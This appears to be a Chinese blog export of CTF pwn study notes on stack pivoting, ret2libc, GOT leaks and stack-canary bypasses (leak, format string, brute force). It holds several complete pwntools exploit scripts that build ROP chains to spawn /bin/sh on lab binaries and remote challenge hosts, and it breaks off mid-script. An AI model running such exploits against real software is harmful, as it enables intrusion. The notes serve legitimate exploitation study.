地址\n如果你想继续执行自己的代码\n\n\nexit()或_exit()\n安全退出程序\n\n\n返回地址写0的时候偶尔会报错\n返回地址处理🎯 2. 32 位 vs 64 位地址\n\n\n\n项目\n32 位\n64 位\n\n\n\n地址长度（位）\n32 位 &#x3D; 4 字节\n64 位 &#x3D; 8 字节\n\n\nPython 里的表示\n0xdeadbeef\n0x7fffdeadbeef\n\n\n打包函数\np32()\np64()\n\n\n解包函数\nu32()\nu64()\n\n\n32位接收\nleak = p.recv(4)      # 32位泄露一般是4字节addr = u32(leak)      # 转成 int\n\n64位接收\nleak = p.recv(6)              # 通常能收到6字节，有时候高两字节是0addr = u64(leak.ljust(8, b&#x27;\\x00&#x27;))  # 补成8字节再解包\n\nljust(length, fillchar) 会将当前的字节串 leak 左对齐到指定的 length（这里是 8 字节），并使用 fillchar（这里是 b&#39;\\x00&#39;，即空字节）从右侧进行填充。\n查看调用函数的传递的参数payload=b&#x27;a&#x27;*(0x48+4)+p32(sys)+p32(main_addr)+p32(sh_addr)\n\n\n1. 初始状态（执行 ret 前）\n假设此时栈布局如下（根据你的 payload）：\npython\npayload = b&#x27;a&#x27;*(0x48+4) + p32(sys) + p32(0x08048722) + p32(sh)\n\n\n栈内存布局：\ntext\nesp        -&gt; 0x80484d0          （覆盖的返回地址，指向 system@plt）esp + 4    -&gt; 0x08048722         （伪造的返回地址）esp + 8    -&gt; 0x080482ea         （参数 &quot;sh&quot; 的地址）\n\n寄存器状态：\n\neip：指向 GetFlag+90 的 ret 指令。\nesp：指向栈顶 0x80484d0。\n\n\n\n2. 执行 ret 指令\nret 等价于 pop eip，具体操作：\n\n从栈顶弹出返回地址到 eip：\n\neip = [esp] → eip = 0x80484d0（跳转到 system@plt）。\nesp = esp + 4 → 栈指针上升 4 字节。\n\n\n栈变化：\ntext\nesp        -&gt; 0x08048722         （原 esp + 4）esp + 4    -&gt; 0x080482ea         （参数 &quot;sh&quot;）\n\n3. 进入 system@plt 后的流程\n(1) 首次调用 system@plt（GOT 未解析）\nsystem@plt 的代码：\nasm\n0x80484d0 &lt;system@plt&gt;    jmp    [0x804a024]   ; 跳转到 GOT 表（首次指向下一行）0x80484d6 &lt;system@plt+6&gt;  push   0x30          ; 重定位偏移0x80484db &lt;system@plt+11&gt; jmp    0x8048460     ; 跳转到动态链接器\n\n\njmp [0x804a024]：\n\n首次调用时，GOT 表 0x804a024 中的值为 0x80484d6（即 system@plt+6），因此继续执行下一条指令。\n\n\npush 0x30：\n\nesp = esp - 4 → 栈指针下降 4 字节。\n\n[esp] = 0x30 → 将 0x30 压栈。\n\n栈变化：\ntext\nesp        -&gt; 0x30               （新压入的值）esp + 4    -&gt; 0x08048722         （伪造的返回地址）esp + 8    -&gt; 0x080482ea         （参数 &quot;sh&quot;）\n\n\njmp 0x8048460：\n\n跳转到动态链接器（_dl_runtime_resolve），解析 system 的真实地址并更新 GOT 表。\n*(2) 动态链接器解析完成后\n\n\n动态链接器会将 system 的真实地址写入 GOT 表 0x804a024。\n\n后续跳转到 system 的真实代码。\n\n\n4. 执行 system 函数时\n(1) system 的调用约定（cdecl）\n\n参数通过栈传递：\n\ncall system 会隐式压入返回地址（但你的漏洞利用直接跳转到 system@plt，未通过 call）。\n参数位于 esp + 4（因为 esp 指向返回地址）。\n\n\n你的场景：\n\n动态链接器解析完成后，直接跳转到 system 的真实代码。\n\n此时栈布局：\ntext\nesp        -&gt; 0x08048722         （伪造的返回地址）esp + 4    -&gt; 0x080482ea         （参数 &quot;sh&quot;）\n\nsystem 会从 esp + 4 读取参数（即 0x080482ea），执行 system(&quot;sh&quot;)。\n\n\n\n\n(2) system 执行后的栈平衡\n\n如果是正常 call system，调用者需通过 add esp, 4 清理参数。\n但你的漏洞利用中：\n通过 ret 跳转到 system@plt，未显式使用 call。\nsystem 执行完毕后会返回到 0x08048722（伪造的地址）。\n\n\n\n5. 全程 esp 变化总结\n\n\n\n步骤\nesp 变化\n栈布局（栈顶向下）\n\n\n\n执行 ret 前\nesp → 0x80484d0\n[0x80484d0, 0x08048722, 0x080482ea]\n\n\n执行 ret\nesp += 4 → 0x08048722\n[0x08048722, 0x080482ea]\n\n\nsystem@plt 中 push 0x30\nesp -= 4 → 0x30\n[0x30, 0x08048722, 0x080482ea]\n\n\n动态链接器解析完成\nesp 恢复为 0x08048722\n[0x08048722, 0x080482ea]\n\n\nsystem 读取参数\n从 esp + 4 读取 0x080482ea\n参数 &quot;sh&quot; 被正确传递\n\n\n6. 关键结论\n\nret 直接修改 eip 和 esp：\n通过弹出返回地址实现控制流劫持，esp 会 +4。\n\n\nsystem 的参数传递依赖栈布局：\n确保 ret 后，esp + 4 指向参数地址（你的 payload 已满足）。\n\n\n动态链接的额外栈操作：\n首次调用 PLT 时会有 push 0x30，esp 会 -4，但最终不影响参数位置。\n\n\n\n通过控制 ret 后的栈布局，你成功将 &quot;sh&quot; 传递给 system，最终获取 shell。\n","categories":["pwn_study"],"tags":["PWN"]},{"title":"栈迁移","url":"/2025/08/01/%E6%A0%88%E8%BF%81%E7%A7%BB/","content":"基础两个对buf的输入pwn75\n\n\n位置不够，且有system函数但没有“&#x2F;bin&#x2F;sh”字符串\n思路泄露ebp的地址，然后gdb调试找到buf开头和ebp之间的偏移以找到buf的位置\n之后通过第二次输入对调用system函数，并在payload中传入字符串“&#x2F;bin&#x2F;sh\\x00”，之后通过这个函数的ret让程序返回到buf开头处执行后门函数\n\n差是0x38\n脚本from pwn import *context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)#p = process(&#x27;./pwn75&#x27;)p = remote(&#x27;pwn.challenge.ctf.show&#x27;,28124)p.recvuntil(b&quot;codename:&quot;)payload=b&quot;a&quot;*0x24+b&quot;1234&quot;p.send(payload)p.recvuntil(b&quot;1234&quot;)ebp = u32(p.recv(4))print(hex(ebp))leave=0x080486ACsystem=0x08048400main=0x08048768off=0x38buf=ebp-offp.recvuntil(b&quot;want to do?&quot;)payload=p32(system)+p32(main)+p32(buf+12)+b&quot;/bin/sh\\x00&quot;payload=payload.ljust(0x28,b&quot;a&quot;)payload+=p32(buf-4)+p32(leave)p.sendline(payload)p.interactive()\n\npayload=p32(system)+p32(main)+p32(buf+12)+b&quot;/bin/sh\\x00&quot;\n\n把&#x2F;bin&#x2F;sh字符段通过payload放入栈上，之后再system函数的的参数位置放置&#x2F;bin&#x2F;sh字符串的位置\npayload=b&quot;a&quot;*0x24+b&quot;1234&quot;p.send(payload)p.recvuntil(b&quot;1234&quot;)ebp = u32(p.recv(4))print(hex(ebp))\n\n注意sendline会在发送payload之后再发送一个&#x2F;n\n会影响接收数据\n一个s一个buf[Black Watch 入群题]PWN\n\n\n\n没有system函数\n思路通过s设置rop链泄露got表地址，之后返回main函数继续执行，buf返回s去执行rop链\n通过泄露的got表地址得到system的需要信息，构造后门函数\n在s放置构造好的后门函数，通过buf让函数进入执行\n脚本from pwn import *from LibcSearcher import *context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)#p= process(&#x27;./spwn&#x27;)p= remote(&quot;node5.buuoj.cn&quot;,28120)elf=ELF(&quot;./spwn&quot;)#gdb.attach(p,&quot;b *0x08048511&quot;)#bss=elf.bss()s=0x0804A300write_plt=elf.plt[&#x27;write&#x27;]write_got=elf.got[&#x27;write&#x27;]main=0x8048513leave=0x08048511payload=p32(write_plt)+p32(main)+p32(1)+p32(write_got)+p32(4)p.recvuntil(b&quot;What is your name?&quot;)p.send(payload)p.recvuntil(b&quot;What do you want to say?&quot;)payload1=b&quot;a&quot;*24+p32(s-4)+p32(leave)p.send(payload1)write=u32(p.recv(4))print(hex(write))libc=LibcSearcher(&quot;write&quot;,write)libc_base=write-libc.dump(&#x27;write&#x27;)system=libc_base+libc.dump(&#x27;system&#x27;)sh=libc_base+libc.dump(&#x27;str_bin_sh&#x27;)payload=p32(system)+p32(0)+p32(sh)p.recvuntil(b&quot;What is your name?&quot;)p.send(payload)p.recvuntil(b&quot;What do you want to say?&quot;)p.send(payload1)p.interactive()\n\n注意:返回地址必须写main的地址\n在 vul_function 函数中，程序会在栈上创建一个名为buf 的缓冲区。\n如果你的 ROP 链没有回到 main，而是直接回到 vul_function，那么 vul_function 在重新执行时会再次创建栈帧，这可能会影响你第一次泄漏后在 .bss 区域布置的 ROP 链。\nmain 函数的结构非常简单，它只调用 vul_function，因此它的栈帧非常稳定，不会干扰 bss 段中的数据。\n当vul_function函数可以正常返回的时候，它的栈帧会被清理而不影响下一步\n进阶canary+迁移附件\n\n\n\n输入的最远位置只到ret的地址，而且没有system函数，所以要栈迁移\n而且有canary泄露\n所以接收buf的地址之后，通过printf的输出泄露canary,然后在buf上布置泄露libc的函数(返回地址写main),让函数跳转过去执行之后泄露，之后用泄露libc基地址去拿到shell\n\n初始时操作系统为程序分配了内存，其中就包括初始栈空间（buf),之后栈迁移跳转到buf段，再次进入main函数，程序在这里再次创建栈帧，所以输出的buf的地址会发生变化，要重新接收地址\n\n脚本from pwn import *import sysfrom LibcSearcher import *file_path = &quot;./111&quot;remote_host = &quot;node4.anna.nssctf.cn&quot;remote_port = 28483context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(file_path)if &#x27;re&#x27; in sys.argv:    p = remote(remote_host, remote_port)else:    p = process(file_path)    #gdb.attach(p, &quot;b*0x04012D7&quot;)p.recvuntil(b&quot;Before you start to attack, I give you a small gift\\n&quot;)p.recvuntil(b&quot;0x&quot;)buf=int(p.recv(12),16)print(b&quot;buf==============&quot;+hex(buf).encode())puts_plt=elf.plt[&#x27;puts&#x27;]read_got=elf.got[&#x27;read&#x27;]main=0x40120Aleave=0x4012D7  rdi=0X401205ret=0X40101apayload1 = b&#x27;a&#x27; *0x28+ b&#x27;b&#x27;p.send(payload1)p.recvuntil(b&#x27;b&#x27;)canary = u64(p.recv(7).rjust(8, b&#x27;\\00&#x27;))print(f&quot;canary -------------------:&#123;hex(canary)&#125;&quot;)pay=p64(rdi) + p64(read_got) + p64(puts_plt)+ p64(ret)+p64(main)+ p64(canary)+p64(buf-8)+p64(leave)p.recvuntil(b&quot;The last read??&quot;)p.send(pay)read= u64(p.recvuntil(&quot;\\x7f&quot;)[-6:] + b&#x27;\\0\\0&#x27;)print(f&quot;read: &#123;hex(read)&#125;&quot;)libc = LibcSearcher(&quot;read&quot;, read)libc_base = read - libc.dump(&quot;read&quot;)system= libc_base + libc.dump(&#x27;system&#x27;)bin= libc_base + libc.dump(&#x27;str_bin_sh&#x27;)print(b&quot;base=============&quot;+hex(libc_base).encode())# rsi=libc_base+0x2be51# rdx=libc_base+0xa5722p.recvuntil(b&quot;0x&quot;)buf=int(p.recv(12),16)print(b&quot;buf==============&quot;+hex(buf).encode())p.send(b&#x27;a&#x27;)pay=p64(rdi)+p64(bin)+p64(system)+b&quot;a&quot;*0x10+p64(canary) + p64(buf- 0x8) + p64(leave)p.recvuntil(b&quot;The last read??&quot;)p.sendline(pay)p.interactive()\n\n收获\n代表栈不平衡\nlea_read附件\n\n\n可以看到没有泄露地址的机会，但是read本身的比较特殊\n\nread的读入地址是存储的是buf的地址，但是实际是按照其相对于rbp的偏移来确定的，所以我们可以把rbp赋值为我们要写入的地址+buf的off,之后把ret的地址覆盖为 lea     rax, [rbp+buf]的地址，让函数重新执行read的准备过程，以正常调用\n\n\n 这里我们可以让函数跳转到bss段，但是注意bss段头部通常会存放一些程序初始化时使用的全局变量。为了避免覆盖这些重要数据，通常会将栈迁移的地址稍微往后移动一些，留出足够的空间。\n\n\n.bss 段是一个未初始化的数据段，它的大小通常在编译时确定，但其中的大部分空间可能没有被任何已知的变量占用。 IDA 显示了 .bss 段从 0x404040 开始，到 0x404069 结束，这表示在这个范围内，IDA 找到了已知的符号（如stdin、stderr等）。\n然而，这并不意味着 .bss 段只到 0x404069。程序的 .bss 段的实际大小可以在 ELF 文件的头部信息中找到。通常情况下，.bss 段会比 IDA 显示的已知符号范围大得多。\n简单来说，IDA 就像一个图书馆目录，只列出了有名字的书（符号），但并不会把所有空书架（未使用的地址）都一一列出来。可以在任何空书架上放置你的东西，只要它属于这个图书馆（.bss 段）即可。\n栈迁移的目标地址必须满足两个条件：\n\n可写： 该内存区域必须是可写的，因为我们要把伪造的ROP链写入到这个位置。bss段就是可写的。\n\n不被占用： 该区域不能被程序当前使用的其他数据（如全局变量）占用，否则会覆盖数据，导致程序崩溃。\n之所以选择bss段，是因为它在程序运行期间通常是未被初始化的，因此可以安全地用于存放我们的ROP链。而使用0x405000（或者脚本中的0x404500），可能是为了避免与bss段起始处的全局变量发生冲突，因为bss段的起始部分可能被用来存储一些未初始化的全局变量。\n\n\n所以我们构造的时候尽量开一个新页，选择一个页对齐的地址，或者至少是一个较大的、远离已知数据的偏移地址。.bss 段的首地址通常被程序用来存放一些重要的全局变量。\n脚本from pwn import *import sysfrom LibcSearcher import *file_path = &quot;./222&quot;remote_host = &quot;node4.anna.nssctf.cn&quot;remote_port = 28483context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(file_path)if &#x27;re&#x27; in sys.argv:    p = remote(remote_host, remote_port)else:    p = process(file_path)    #gdb.attach(p, &quot;b*0x401211&quot;)def sla(a, b):  p.sendlineafter(a, b)def ru(a):  p.recvuntil(a)def sa(a, b):  p.sendafter(a, b)    bss=0x404500main=0x4011DB   rdi=0x401225leave=0x40121Bread=0x401200rbp=0x40115dputs_plt=elf.plt[&quot;puts&quot;]puts_got=elf.got[&quot;puts&quot;]ret=0x40101apay1=b&quot;a&quot;*0x50+p64(bss+0x50)+p64(read)sa(b&quot;Xswlhhh!Use stack hijacking on him!&quot;,pay1)pay=p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(rbp)+p64(bss+0x200+0x50)+p64(read)pay=pay.ljust(0x50,b&quot;a&quot;)+p64(bss-8)+p64(leave)p.send(pay)puts = u64(p.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8, b&#x27;\\x00&#x27;))print(b&quot;puts===========&quot;+hex(puts).encode())libc=LibcSearcher(&quot;puts&quot;,puts)libc_base=puts-libc.dump(&quot;puts&quot;)print(b&quot;libc_base===========&quot;+hex(libc_base).encode())system=libc_base+libc.dump(&quot;system&quot;)bin=libc_base+libc.dump(&quot;str_bin_sh&quot;)print(b&quot;system===========&quot;+hex(system).encode())print(b&quot;bin===========&quot;+hex(bin).encode())payload=p64(ret)+p64(rdi)+p64(bin)+p64(ret)+p64(system)payload=payload.ljust(0x50,b&quot;\\x00&quot;)payload+= p64(bss+0x200)+p64(leave)p.send(payload)p.interactive()\n\n收获\n调用system函数会压栈，所以这个地址也要抬高，确保它是在rw-p权限段\n在没有抬高栈地址的时候\n\n\n此时权限不够\n","categories":["pwn_study"],"tags":["PWN","栈迁移"]},{"title":"栈溢出进阶","url":"/2025/07/23/%E6%A0%88%E6%BA%A2%E5%87%BA%E8%BF%9B%E9%98%B6/","content":"栈迁移change_ebp（栈劫持Demo1）\n\n最多填充12个字节，只能覆盖到ebp\n\n写入的magic的范围到0x0804A380～0x0804A38C\n所以栈迁移\n脚本from pwn import *p = process(&quot;./change_ebp&quot;)gdb.attach(p,&quot;b *0x080485D3&quot;)backdoor = 0x0804850Bmagic_addr = 0x0804A380p.recvuntil(&quot;leave your name\\n&quot;)payload = &quot;junk&quot; + p32(backdoor) + p32(magic_addr)p.send(payload)p.interactive()\n\nebp 的作用在函数调用时，ebp 用于：\n\n定位局部变量（如 v1 位于 ebp-8）。\n在函数返回时恢复调用者的栈帧（通过 leave 指令）。\n\n典型函数尾声（leave; ret）：\nleave  ; 相当于 mov esp, ebp; pop ebpret    ; pop eip，跳转到返回地址\n\n\nleave 会：\n把 ebp 的值赋给 esp（栈指针指向 ebp）。\n然后 pop ebp（恢复调用者的 ebp）。\n\n\nret 会 pop eip（跳转到返回地址）。\n\n\n(1) leave 指令的执行\n\nmov esp, ebp：\n原本 ebp 指向栈帧基址，但已经被覆盖为 magic_addr（0x0804A380）。\n所以 esp 现在指向 magic_addr（全局变量 magic 的地址）。\n\n\npop ebp：\n从 esp（magic_addr）弹出一个值到 ebp。\n如果 magic 区域没有特殊构造，这里可能不重要。\n\n\n\n(2) ret 指令的执行\n\npop eip：\n从 esp（magic_addr + 4）弹出一个值到 eip（程序计数器）。\n关键点：\nmagic_addr + 4 是 magic 变量的第 5-8 字节。\n攻击者已经通过 read(0, &amp;magic, 0xCu) 向 magic 写入了 12 字节数据。\n如果 magic + 4 处存放的是 backdoor 地址，ret 就会跳转到 backdoor！\n\n\n\n\n\nret2libc3(栈劫持Demo2)\n在这里介绍一种新的办法，使函数可以不返回main函数\n脚本from pwn import *p = process(&quot;./ret2libc3&quot;)gdb.attach(p,&quot;b *0x0804854C&quot;)elf = ELF(&quot;./ret2libc3&quot;)libc = ELF(&quot;/lib/i386-linux-gnu/libc-2.23.so&quot;)gets_got = elf.got[&quot;gets&quot;]gets_plt = elf.plt[&quot;gets&quot;]puts_plt = elf.plt[&quot;puts&quot;]# ROPgadget --binary ./ret2libc3 --only &quot;pop|ret&quot;pop_ebp_ret = 0x080485db# ROPgadget --binary ./ret2libc3 | grep leaveleave_ret = 0x08048448rop_addr = 0x804a800p.recvuntil(&quot;ret2libc3\\n&quot;)payload1 = &quot;a&quot; * 0x108 + &quot;junk&quot;payload1 += p32(puts_plt) + p32(pop_ebp_ret) + p32(gets_got)payload1 += p32(gets_plt) + p32(pop_ebp_ret) + p32(rop_addr)payload1 += p32(pop_ebp_ret) + p32(rop_addr - 4)+p32(leave_ret)p.sendline(payload1)leak_addr = u32(p.recv(4))libc_base = leak_addr - libc.symbols[&quot;gets&quot;]libc.address = libc_baselog.success(&quot;libc_base:&quot; + hex(libc.address))system = libc.symbols[&quot;system&quot;]binsh = libc.search(&quot;/bin/sh&quot;).next()payload2 = b&quot;A&quot; * 0x108  # 填充缓冲区payload2 += p32(system)  # 调用 systempayload2 += p32(0)  # 返回地址（不重要，因为直接拿 shell）payload2 += p32(binsh)   # system 的参数p.sendline(payload2)p.interactive()\n\n第一个paylaodpayload1 += p32(puts_plt) + p32(pop_ebp_ret) + p32(gets_got)\n\n输出gets的got表地址，方便寻找libc基址\n然后p32(pop_ebp_ret)取出两个地址，一个放进ebp,一个放入eip(ret指令)，放进eip的也就是p32(gets_plt)，正好接上下一条指令继续执行。\npayload1 += p32(gets_plt) + p32(pop_ebp_ret) + p32(rop_addr)\n\n调用gets的plt表，又产生了一个输入机会\npayload1 += p32(pop_ebp_ret) + p32(rop_addr - 4)+p32(leave_ret)\n\n把rop_addr - 4作为ebp，所以程序会跳转到这里\n而rop_addr 的数据可以有payload2填入，精心构造即可\n第二个paylaod填入了上面的返回地址，使程序进入system函数，再构造system函数的参数&#x2F;bin&#x2F;sh\n就构造好了后门函数\nx64的情况其实差不多，就是先传入参数\nfrom pwn import *p = process(&quot;./ret2libc3_x64&quot;)gdb.attach(p,&quot;b *0x00000000004006F1&quot;)elf = ELF(&quot;./ret2libc3_x64&quot;)libc = ELF(&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;)gets_got = elf.got[&quot;gets&quot;]puts_plt = elf.plt[&quot;puts&quot;]gets_plt = elf.plt[&quot;gets&quot;]rop_addr = 0x601800# ROPgadget --binary ./ret2libc3_x64 --only &quot;pop|ret&quot;# 0x0000000000400783 : pop rdi ; retrdi = 0x0000000000400783pop_rsp3 = 0x000000000040077d # pop rsp ; pop r13 ; pop r14 ; pop r15 ; retp.recvuntil(&quot;ret2libc3_x64\\n&quot;)payload1 = &quot;a&quot; * 0x100 + &quot;junkjunk&quot;payload1 += p64(rdi) + p64(gets_got)payload1 += p64(puts_plt)payload1 += p64(rdi) + p64(rop_addr)payload1 += p64(gets_plt)payload1 += p64(pop_rsp3) + p64(rop_addr - 0x18)p.sendline(payload1)leak_addr = u64(p.recv(6).ljust(8,&quot;\\x00&quot;))libc_base = leak_addr - libc.symbols[&quot;gets&quot;]libc.address = libc_baselog.success(&quot;libc_base:&quot; + hex(libc.address))system = libc.symbols[&quot;system&quot;]binsh = libc.search(&quot;/bin/sh&quot;).next()payload2 = p64(rdi) + p64(binsh)payload2 += p64(system)p.sendline(payload2)p.interactive()\n\n\n\n\n\n\n\n\n\nrbp_leave(栈劫持Demo3)\nv1存在栈溢出漏洞，但可输入的字符数太少\n最多覆盖到返回地址处，无法直接rop\n所以考虑用name来构造，然后用v1转过去\n脚本from pwn import *from LibcSearcher import *p = process(&quot;./rbp_leave&quot;)#gdb.attach(p,&quot;b *0x000000000040073F&quot;)elf = ELF(&quot;./rbp_leave&quot;)name_addr = 0x6010A0# ROPgadget --binary ./rbp_leave --only &quot;pop|ret&quot;# 0x0000000000400783 : pop rdi ; retrdi = 0x4007c3rsi2 = 0x4007c1pop_rsp3 = 0x4007bd # pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret# ROPgadget --binary ./rbp_leave | grep leaveleave_ret = 0x4006f0 # leave ; retret = 0x4006f1read_input = 0x4006C7rop_addr2 = name_addr + 0x800name = p64(ret) *20name += p64(rdi) + p64(elf.got[&quot;read&quot;])name += p64(elf.plt[&quot;puts&quot;])name += p64(rdi) + p64(rop_addr2)name += p64(rsi2) + p64(0x200) + p64(0)name += p64(read_input)name += p64(pop_rsp3) + p64(rop_addr2 - 0x18)p.sendafter(b&quot;leave your name\\n&quot;,name.ljust(0x400,b&quot;\\x00&quot;))payload1 = b&quot;a&quot; * 0x100payload1 += p64(name_addr - 8)payload1 += p64(leave_ret)p.sendafter(&quot;try to break it\\n&quot;,payload1)leak_addr = u64(p.recv(6).ljust(8,b&quot;\\x00&quot;))libc=LibcSearcher(&quot;read&quot;,leak_addr)libc_base = leak_addr - libc.dump(&quot;read&quot;)libc.address = libc_baseprint(hex(libc.address))system = libc_base+libc.dump(&quot;system&quot;)binsh = libc_base+libc.dump(&quot;str_bin_sh&quot;)payload2 = p64(rdi) + p64(binsh)payload2 += p64(system)p.send(payload2)p.interactive()\n\n第一个payloadname += p64(rdi) + p64(elf.got[&quot;read&quot;])name += p64(elf.plt[&quot;puts&quot;])\n\n调用puts函数打印read的got表地址\nname += p64(rdi) + p64(rop_addr2)name += p64(rsi2) + p64(0x200) + p64(0)name += p64(read_input)\n\n调用read函数，read的参数比较多，所以多用了几个寄存器，把从终端输入的数据放在p64(rop_addr2)的位置上\nname += p64(pop_rsp3) + p64(rop_addr2 - 0x18)\n\n因为p64(pop_rsp3)有三个pop指令，所以有要空出足够的距离，防止把重要数据弹出了\n第二个payload填补v1\npayload1 += p64(name_addr - 8)payload1 += p64(leave_ret)\n\np64(name_addr - 8)：覆盖 RBP\n\n目标：将 RBP 修改为 name_addr - 8。\n为什么是 name_addr - 8？\nleave 指令会执行 mov rsp, rbp，因此 rsp 将指向 name_addr - 8。\n接下来的 ret 会从 name_addr（即 name 的起始地址）开始执行 ROP 链。\n-8 的调整：因为 leave 之后会 pop rbp，rsp 会 +8，最终指向 name_addr。\n\n\n\n第三个payloadpayload2 = p64(rdi) + p64(binsh)payload2 += p64(system)\n\n为第一个payload提供的read输入\n综上所述\n通过0和2构造完整的后门函数，然后通过1进入执行这个后门函数\n脚本\n如何选择合适的 rop_addr2？\n方法 1：使用 name 的扩展区域\n\n如果 name 的大小是 0x400，可以选择 name_addr + 0x400 之后的地址（如 name_addr + 0x800）。\n优点：简单直接，无需额外泄露地址。\n缺点：需确保 name 区域足够大（或程序允许越界写入）。\n\n方法 2：使用 libc 中的可写段\n\nlibc 中有许多可写区域（如 __malloc_hook、__free_hook 附近）。\n步骤：\n泄露 libc 基址（如通过 puts(read_got)）。\n计算目标地址（如 libc_base + 0x3c4b00）。\n\n\n优点：稳定，适合大型 ROP 链。\n缺点：需要先泄露 libc 地址。\n\n方法 3：使用堆（Heap）\n\n如果程序调用了 malloc，堆地址可能可预测。\n步骤：\n泄露堆地址（如通过 puts(malloc_got)）。\n选择堆块中的空闲区域。\n\n\n优点：空间大，不易冲突。\n缺点：需要堆泄露。\n\ncanary保护Canary的设计思想简单高效，就是在栈溢出发生的高危区域的尾部插入一个值，当函数返回时检测Canary的值是否发生了改变，从而判断是否发生栈溢出&#x2F;缓冲区溢出。\n保护原理当程序启用Canary编译后\n插入Canary值\nmov rax，qword ptr fs:[0x28]mov qword ptr[rbp-8]，rax\n\n检查\nmoV rdx,QWORD PTR [rbp-0x8]xOr rdx,QWORD PTR fs:0x28je0x4005d7&lt;main+65&gt;call 0x400460&lt;_stack_chk_fail@plt&gt;\n\n如果检测出Canary的值被修改过，则会运行到__stack_chk_fail函数。这个函数位于glibc中，默认情况下经过ELF的延迟绑定。也就是说，stack_chk_fail是一个外部函数，当程序没有开启FULL RELRO保护时，可以被GOT劫持攻击。攻击者可以先劫持stack_chk_fail函数的GOT，再触发Canary检测报错，这时就会进入劫持的地址，这也是一种利用思路\n\n在 Linux x86-64 架构下，Canary（也称为 stack_guard 或栈保护值）通常并不是直接存储在栈上（那样它就容易被溢出），而是存储在一个线程本地存储 (TLS) 区域中。\n在 x86-64 Linux 系统中，fs 寄存器（或者 gs 寄存器）被操作系统用于指向当前线程的线程本地存储 (TLS) 区域。\n\nGCC 编译器在编译时，会在程序启动时初始化这个 Canary 值，并将其存储在 TLS 区域的一个特定偏移量上。\n对于 x86-64 Linux，这个偏移量通常是 0x28。所以，fs:0x28 指向的内存地址就是当前线程的 stack_guard（即 Canary 值）的存储位置。\n\n而且TLS中的值由函数security_init进行初始化\n\n最后，注意Canary最后的一个字节会被设置为0，防止类似printf（”%s”,&amp;buf）形式的函数不小心将Canary的值打印出来，所以用“\\x00”字符（在C语言中表示字符串的结尾）来做一个截断，和ASLR没有关系。\n栈结构\n[ buf (256 bytes)         ]  ← esp+0x00[ stack canary (4 bytes)  ]  ← esp+0x100[ saved ebp (4 bytes)     ][ return address (4 bytes)]\n\n对于有Canary的程序，如果考虑栈溢出攻击，主要有下面4个思路：\n1）利用泄露函数泄露出Canary的值，再进行利用。\n2）爆破得到Canary的值。\n3）__stack_chk_fail函数泄露关键信息。\n4）修改TLS中的stack_guard值。\n1.leak_canary（泄露Canary值）\n\n\n脚本1（printf_替代&#x2F;x00）from pwn import *p = process(&quot;./leak_canary&quot;)#gdb.attach(p,&quot;b *0x08048631&quot;)main=0x0804867fbin= 0x080485CCpayload=b&#x27;a&#x27;*0x100+b&#x27;b&#x27;p.send(payload)p.recvuntil(b&#x27;a&#x27;*0x100)canary=u32(p.recv(4))-ord(&#x27;b&#x27;)print(hex(canary))payload=b&#x27;\\x00&#x27;*0x100+p32(canary)payload+=p32(0)*2payload+=p32(main)payload+=p32(bin)p.send(payload)p.interactive()\n\n\n\npayload=b&#x27;a&#x27;*0x100+b&#x27;b&#x27;p.send(payload)p.recvuntil(b&#x27;a&#x27;*0x100)canary=u32(p.recv(4))-ord(&#x27;b&#x27;)print(hex(canary))\n\n用b替代canary最低位的\\x00,使得它的值可以被输出\n然后用收到的数据减去b的值就是canary的值\npayload+=p32(0)*2\n\n两个padding\n\n分配了 0x118字节的栈空间给局部变量和padding。\n栈空间一次性分配，便于管理和性能\n\n编译器在函数入口会执行类似 sub esp, 0x118 的操作，一次性给函数所有局部变量、临时数据和对齐空间分配足够大的连续栈空间。分配的 280 字节是 buf + 其他局部变量 + padding\n\n这块空间里包含你所有局部变量（比如 buf）、隐式变量（比如保存的寄存器）、以及为了满足 CPU 访问对齐需求而插入的 padding。\n从ebp开辟了0x118个字节存放，但buf从ebp-0x10c开始存储，接着是canary，所以还有两个padding\n\n\ncanary不一定是挨着缓冲区的，单在这道题是的\n\n\n\n\n情况\n会插 canary 紧挨数组吗？\n\n\n\n函数里有 char buf[xxx]\n✅ 一般会放 canary 在 buf 后面\n\n\n没有数组、不会栈溢出\n❌ 通常不会启用 canary\n\n\n数组不在栈上（比如 malloc 的）\n❌ 不是栈保护的范围\n\n\n特殊优化或内联小函数\n⚠️ 可能被省略\n\n\n\n虽然 canary 的位置不是硬编码的，但在实际场景中（特别是题目明确有 char buf[] 并开启了 canary），它通常 就在 buf 后面，且通过调试或试探可以准确确定它的偏移位置。\n\n脚本2（格式化字符串）可以看到buf在第7个位置上\n而且buf有256个字节，可以存放64个字符\n所以canary就是在第64+7即71个参数的位置\nfrom pwn import *p = process(&quot;./leak_canary&quot;)#gdb.attach(p,&quot;b printf&quot;)target = 0x080485CCp1 = &quot;%71$p\\n&quot;p.send(p1)leak_info = p.recvuntil(&quot;\\n&quot;,drop = True)canary = int(leak_info,16)log.success(&quot;canary:&quot; + hex(canary))p2 = b&quot;\\x00&quot; * 0x100 + p32(canary)p2 += p32(0) * 3p2 += p32(target)p.send(p2)p.interactive()\n\n\n\n\n\n\n\n2.one_by_one_bruteforce(逐个字节爆破)通过fork函数开启子进程交互的题目，因为fork函数会直接拷贝父进程的内存，所以每次创建的子进程的Canary是相同的。我们可以利用这个特点，逐个字节地将Canary爆破出来。\n\n脚本from pwn import *p = process(&quot;./one_by_one_bruteforce&quot;)def bruteforece1bit():\tglobal known\tfor i in range(256):\t\tp1 = &quot;a&quot; * 0x108\t\tp1 += known\t\tp1 += chr(i)\t\tp.sendafter(&quot;one_by_one_bruteforce\\n&quot;,p1)\t\ttry:\t\t\tinfo = p.recvuntil(&quot;\\n&quot;)\t\t\tif &quot;*** stack smashing detected ***:&quot; in info:\t\t\t\tp.send(&quot;n\\n&quot;)\t\t\t\tcontinue\t\t\telse:\t\t\t\tknown += chr(i)\t\t\t\tbreak\t\texcept:\t\t\tlog.info(&quot;maybe there something wrong&quot;)\t\t\tbreakdef bruteforce_canary():\tglobal known\tknown += &quot;\\x00&quot;\tfor i in 